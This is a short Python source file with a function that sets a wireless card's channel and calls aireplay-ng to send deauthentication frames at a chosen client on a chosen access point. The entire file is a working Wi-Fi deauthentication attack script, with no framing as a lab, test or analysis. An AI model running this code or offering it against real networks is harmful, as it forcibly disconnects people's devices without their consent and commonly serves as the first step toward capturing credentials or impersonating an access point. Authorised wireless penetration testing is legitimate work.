import subprocess

def send_deauth(target_mac, bssid, channel, interface="wlan1"):
    print(f"[DEAUTH] Targeting {target_mac} on AP {bssid} (CH {channel})")

    # Set the interface to the correct channel first
    try:
        subprocess.run(["iwconfig", interface, "channel", str(channel)],
                       check=True, stdout=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        print("[ERROR] Failed to set channel")
        return False

    try:
        subprocess.run([
            "aireplay-ng", "--deauth", "10",
            "-a", bssid,
            "-c", target_mac,
            interface
        ], check=True)
        print("[DEAUTH] Deauth sent successfully.")
        return True
    except subprocess.CalledProcessError:
        print("[ERROR] Failed to send deauth.")
        return False
